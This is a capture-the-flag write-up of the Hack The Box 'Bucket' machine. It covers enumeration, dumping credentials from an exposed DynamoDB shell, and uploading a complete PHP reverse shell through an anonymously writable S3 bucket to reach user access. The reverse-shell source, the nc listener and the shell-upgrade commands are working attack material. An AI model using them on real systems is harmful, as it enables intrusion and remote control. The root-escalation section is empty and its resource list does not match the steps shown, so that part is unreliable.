# Introduction

![Bucket](https://www.hackthebox.eu/storage/avatars/3f07dd46f3ff7d287d2f736b18c6ded7.png)

| Point | Description |
| :------:| :------: |
| Name | Bucket  |
| OS   | Linux  |
| Difficulty Rating| Medium   |
| Release | 12 Dec 2020   |
| IP | 10.10.10.220   |
| Owned | 17 Oct 2020 |

# Short retelling

* Find a subdomain
* Enamuration services
* Recon DynamoDB with AWS CLI
* Find buckets in S3 AWS
* Upload a php reverse shell
* Get the user.txt
* Create the table with RCE in DynamoDB
* Get root's ia_rsa and root.txt

# Enumeration

## Nmap

Lets start reconing machine "Bucket" 10.10.10.212 with Nmap

```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -sC -p- 10.10.10.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 04:49 EST
Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 72.44% done; ETC: 04:59 (0:02:51 remaining)
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.29s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We find 80/tcp and 22/tcp ports, so lets check website http://bucket.htb.

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/10.PNG)

The hyperlinks on the pages are leading to nothing.

Enumerating directories gives no results.

Lets analyze source code of the page.

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/11.PNG)

We found out subdomain **s3.bucket.htb**. Add it to /etc/hosts and check http://s3.bucket.htb webpage.

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/12.PNG)

We see just ‘{“status”: “running”}’ on the webpage.


## FuFF

Next step will be enumerating directories of s3.bucket.htb.

```
┌──(root💀kali)-[/home/kali]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://s3.bucket.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://s3.bucket.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

health                  [Status: 200, Size: 54, Words: 5, Lines: 1]
shell                   [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [204750/204750] :: Job [1/1] :: 109 req/sec :: Duration: [0:32:40] :: Errors: 40 ::                                                                          
```

We find two directories: *s3.bucket.htb/health* ans *s3.bucket.htb/shell*.

Lets visit the http://s3.bucket.htb/health

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/13.PNG)

URL http://s3.bucket.htb/shell redirect us to to http://444af250749d:4566/shell/. That's fine. Checking hints on HTB forum and find out about extra slash “/” added at the end of the URL.

Lets visit the http://s3.bucket.htb/shell/

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/14.PNG)

# Explotation

Ok, we have two services *s3* and *dynamodb* and we have *DynamoDB JavaScript Shell* of amazon web services.

Let's use google to get more information.

> An Amazon S3 bucket is a public cloud storage resource available in Amazon Web Services' (AWS) Simple Storage Service (S3), an object storage offering. Amazon S3 buckets, which are similar to file folders, store objects, which consist of data and its descriptive metadata.

> A bucket is a container for objects stored in Amazon S3. Every object is contained in a bucket. For example, if the object named photos/puppy.jpg is stored in the awsexamplebucket1 bucket in the US West (Oregon) Region, then it is addressable using the URL https://awsexamplebucket1.s3.us-west-2.amazonaws.com/photos/puppy.jpg. 

> DynamoDB is a key-value, noSQL database developed by Amazon. It’s unlike some other products offered by Amazon and other vendors in that it’s not just an open source system, like Spark, hosted on the vendor’s platform. Amazon wrote this for their own internal needs and now they make it available to their customers.

We need to find hacking tricks with AWS Simple Storage Service.

* https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed
* https://medium.com/@cvignesh28/aws-s3-bucket-misconfiguration-c11e8f86e9a7
* https://blog.securelayer7.net/hands-on-aws-s3-bucket-vulnerabilities/

Ok, in every exploits is using AWS CLI on host, but we have web-shell *DynamoDB JavaScript Shell*.

We find how to check tables in dynamodb with javascript [here](https://stackoverflow.com/questions/57988963/how-to-access-dynamodb-local-using-dynamodb-javascript-shell).

```
var params = {
    TableName: 'my-table',
    Limit: 10
};
dynamodb.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});
```

We guess about table's names. And table name 'users' gets true result. I can't guess another table's names.

![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/15.PNG)

We find out about credetials (three usernames and three passwords).

```
Mgmt: Management@#1@#
Cloudadm: Welcome123!
Sysadm: n2vM-<_K_Q:.Aa2
```

Try to use the credentials to get an SSH shell, but it’s not working. 

We need to do more enumeration to get a shell on this box or a reverse shell.

Ok, we also can check buckets in s3.bucket.htb.

There are three [vulnerabilities](https://blog.securelayer7.net/hands-on-aws-s3-bucket-vulnerabilities/) of AWS S3:

> S3 bucket configured to allow anonymous users to list, read or write data to the bucket.

> S3 bucket configured to allow access to authenticated users. In this case, a valid AWS access key and secret are required to test for this condition.

> Amazon S3 access control lists (ACLs) enables us to manage our access to AWS S3 buckets. Each bucket and object has its ACL attached to it as a subresource. It also defines which AWS accounts or groups should be granted access and the type of access. This permission are readable publically this doesn’t show any type of misconfiguration of the bucket itself but may reveal which users have what type of access.

Let's [install](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html) AWS CLI:

```
$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws --version            
aws-cli/2.1.26 Python/3.7.3 Linux/5.9.0-kali1-amd64 exe/x86_64.kali.2020 prompt/off
```

Next we need to [configure](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html) AWS CLI:

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: text
```

Now I know how to check all tables witn manuals of aws:

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws dynamodb list-tables --endpoint-url http://s3.bucket.htb 
TABLENAMES      users
```

We are lucky, there is only one tablename 'users'.

Let's list out the contents from the bucket using AWS CLI enter [below command](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html):

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws s3 ls --endpoint-url http://s3.bucket.htb               
2021-02-16 03:05:03 adserver
```

We find bucket *adserver*.

List S3 objects/contents and common prefixes under a prefix or all S3 buckets enter below command with the target bucket name.

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws s3 ls s3://adserver --endpoint-url http://s3.bucket.htb
                           PRE images/
2021-02-16 03:09:04       5344 index.html
                                                                                                                 
                                                                                                                  
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws s3 ls s3://adserver/images/ --endpoint-url http://s3.bucket.htb
2021-02-16 03:09:04      37840 bug.jpg
2021-02-16 03:09:04      51485 cloud.png
2021-02-16 03:09:04      16486 malware.png

```

This bucket is related to the main website, as we already know because the images are stored on this location, by example: http://s3.bucket.htb/adserver/images/bug.jpg. Well, if the images are stored in this location and we can access them from the main page, then we can also access a payload with a reverse shell.

Download php reverse shell from [github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and edit.

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# cat back.php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.4';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```

Upload it to *s3://adserver/images/*:

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws s3 cp /home/kali/HTB/Bucket/back.php s3://adserver/images/ --endpoint-url http://s3.bucket.htb 
upload: ./back.php to s3://adserver/images/back.php           
                                                                                                                  
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# aws s3 ls s3://adserver/images/ --endpoint-url http://s3.bucket.htb                               
2021-02-16 03:43:45       3456 back.php
2021-02-16 03:43:31      37840 bug.jpg
2021-02-16 03:43:31      51485 cloud.png
2021-02-16 03:43:31      16486 malware.png
```

Start listener

```
nc -lvp 1234
```

Try open the payload by going to http://bucket.htb/images/back.php.

Some seconds ago I get success with my payload.
Get reverse shell from **www-data**.

```
┌──(root💀kali)-[/home/kali/HTB/Bucket]
└─# nc -lvp 1234 
listening on [any] 1234 ...
connect to [10.10.16.4] from bucket.htb [10.10.10.212] 48778
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:46:14 up  2:52,  0 users,  load average: 0.17, 1.33, 1.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# Privilege Escalation#1

Upgrade reverse shell and check *home* direcory
 
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bucket:/$ ls
ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
www-data@bucket:/$ ls home
ls home
roy
www-data@bucket:/$ cat /home/roy/user.txt
cat /home/roy/user.txt
cat: /home/roy/user.txt: Permission denied
```

We need in privilege escalation, so run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

And can't see sometheng interesting in the report.

And we remember about credentials, which were fond in DynamoDB:

```
Mgmt: Management@#1@#
Cloudadm: Welcome123!
Sysadm: n2vM-<_K_Q:.Aa2
```

Use `su roy` and password `n2vM-<_K_Q:.Aa2` is right.

We get **user.txt**

```
www-data@bucket:/$ su roy
su roy
Password: n2vM-<_K_Q:.Aa2

roy@bucket:~$ cd ~
cd ~
roy@bucket:~$ ls
ls
project  user.txt
roy@bucket:~$ cat user.txt
cat user.txt
b10f444a760afce0900d49c472fb154a
```

Also we could notice, that roy belongs to group *sysadm*

```
[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
```

# Privilege Escalation#2



# Result and Resources

1. https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
2. https://github.com/dotPY-hax/gitlab_RCE
3. https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
4. https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1
5. https://habr.com/ru/post/56049/
6. https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html
